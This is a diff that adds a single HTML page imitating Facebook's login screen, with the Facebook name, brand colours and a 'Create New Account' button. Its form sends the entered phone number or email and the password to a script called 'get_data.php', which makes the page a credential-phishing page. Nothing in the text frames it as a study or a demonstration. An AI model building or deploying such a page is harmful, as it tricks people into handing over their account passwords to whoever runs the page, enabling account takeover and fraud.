@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<meta name="robots" content="index, follow">
+	<title>facebook login</title>
+	<style>
+		body{
+			background-color: snow;
+		}
+		div{
+			margin: auto;
+			margin-top: 15%;
+		}
+		input{
+			border-radius: 5px;
+			border: 1px solid #ccc;
+			background-color: rgb(220, 220, 220);
+			box-sizing: content-box;
+			width:100%;
+			padding: 10px;
+			display: block;
+		}
+		input[type="submit"]{
+			background-color: #3b5998;
+			color: white;
+			border: none;
+			font-weight: bolder;
+					}
+		
+		h2{
+			font-family: sans-serif;
+			font-weight: bolder;
+		}
+		a{
+			text-decoration: none;
+			margin-top: 7px;
+			display: block;
+		}
+		a,h2{
+			color: #3b5998;
+		}
+	</style>
+</head>
+
+<body>
+
+	<div align="center" style="width: 300px">
+	<h2>Facebook</h2>
+	<form action="get_data.php" method="post">
+		<input type="text" name="name" placeholder="Mobile number or email address"><br>
+		<input type="text" name="password" placeholder="Password"><br>
+		<input type="submit" name="submit" value="Log In">
+	</form>
+	<a href="#" >forgot password?</a>
+	<hr style="background: lightgrey;margin: 30px;">
+	<input type="button" name="" style="width:50%;background-color:/*#5cb85c*/ #119f24;color: white;" value="Create New Account">
+	</div>
+
+
+</body>
+</html>
